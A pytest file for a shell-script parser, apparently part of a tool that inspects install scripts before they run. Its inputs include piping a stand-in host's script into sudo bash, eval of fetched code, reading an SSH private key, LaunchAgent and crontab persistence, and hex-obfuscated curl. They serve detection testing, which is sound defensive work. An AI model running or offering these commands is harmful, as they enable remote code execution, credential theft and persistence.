from lookfirst.static.shell_parse import DYNAMIC, decode_ansi_c, parse_shell


def argvs(text: str) -> list[list[str]]:
    return [c.argv for c in parse_shell(text).commands]


def test_pipelines_keep_their_order() -> None:
    parsed = parse_shell("curl -fsSL https://x.example/i.sh | sudo bash -s -- --yes")
    curl, bash = parsed.commands
    assert curl.argv == ["curl", "-fsSL", "https://x.example/i.sh"]
    assert bash.argv[:2] == ["sudo", "bash"]
    assert curl.pipeline == bash.pipeline is not None
    assert (curl.position, bash.position) == (0, 1)


def test_quotes_and_simple_variables_are_resolved() -> None:
    parsed = parse_shell('URL="https://x.example/a.sh"\ncurl "$URL" \'b c\' ${URL}')
    assert parsed.commands[0].argv == [
        "curl",
        "https://x.example/a.sh",
        "b c",
        "https://x.example/a.sh",
    ]
    assert parsed.variables["URL"] == "https://x.example/a.sh"


def test_home_becomes_tilde_and_unknown_variables_stay_dynamic() -> None:
    (cmd,) = parse_shell('cat "$HOME/.ssh/id_rsa" "$UNKNOWN/x"').commands
    assert cmd.argv[1] == "~/.ssh/id_rsa"
    assert cmd.argv[2] == "${UNKNOWN}/x"
    assert cmd.dynamic


def test_command_and_process_substitutions_are_children() -> None:
    parsed = parse_shell('eval "$(curl -s https://x/a)"; bash <(curl -s https://x/b)')
    by_name = {c.argv[0]: c for c in parsed.commands}
    eval_cmd = by_name["eval"]
    assert eval_cmd.argv[1] == f"$({DYNAMIC})"
    children = parsed.children(eval_cmd.index)
    assert [c.argv[0] for c in children] == ["curl"]
    assert children[0].subst == "command"
    bash = by_name["bash"]
    (inner,) = parsed.children(bash.index)
    assert inner.subst == "process_in"


def test_redirects_and_heredocs() -> None:
    parsed = parse_shell(
        "cat > ~/Library/LaunchAgents/x.plist <<EOF\n<plist>$HOME</plist>\nEOF\necho hi >> ~/.zshrc"
    )
    cat, echo = parsed.commands
    assert [(r.op, r.target) for r in cat.redirects] == [(">", "~/Library/LaunchAgents/x.plist")]
    assert "<plist>" in (cat.heredoc or "")
    assert [(r.op, r.target) for r in echo.redirects] == [(">>", "~/.zshrc")]


def test_subshells_in_a_pipeline_share_its_position() -> None:
    parsed = parse_shell('(crontab -l; echo "* * * * * x") | crontab -')
    first, echo, last = parsed.commands
    assert first.pipeline == echo.pipeline == last.pipeline
    assert (first.position, echo.position, last.position) == (0, 0, 1)


def test_functions_and_lists_are_walked() -> None:
    assert argvs("f() { curl -o /tmp/t https://y/t && chmod +x /tmp/t; }") == [
        ["curl", "-o", "/tmp/t", "https://y/t"],
        ["chmod", "+x", "/tmp/t"],
    ]


def test_ansi_c_strings_are_decoded_and_flagged_as_hidden_names() -> None:
    (cmd,) = parse_shell("$'\\x63\\x75\\x72\\x6c' -s https://x").commands
    assert cmd.argv[0] == "curl"
    assert cmd.obfuscated
    assert decode_ansi_c("\\x41\\102\\n") == "AB\n"


def test_backslashes_that_hide_a_name_are_flagged_but_alias_escapes_are_not() -> None:
    assert parse_shell("c\\u\\r\\l -s https://x").commands[0].obfuscated
    assert not parse_shell("\\rm -f x").commands[0].obfuscated
    assert not parse_shell("./Unit\\ tests/run").commands[0].obfuscated


def test_unreadable_lines_are_reported() -> None:
    parsed = parse_shell("echo start\nif [ -f x ]; then\nfi fi )) ((\necho end")
    assert parsed.unreadable
    assert all(start >= 1 for start, _ in parsed.unreadable)


def test_clean_scripts_have_nothing_unreadable() -> None:
    assert (
        parse_shell("case $x in a) echo a;; esac\n[[ $a == b ]] && echo ok\narr=(a b c)").unreadable
        == []
    )
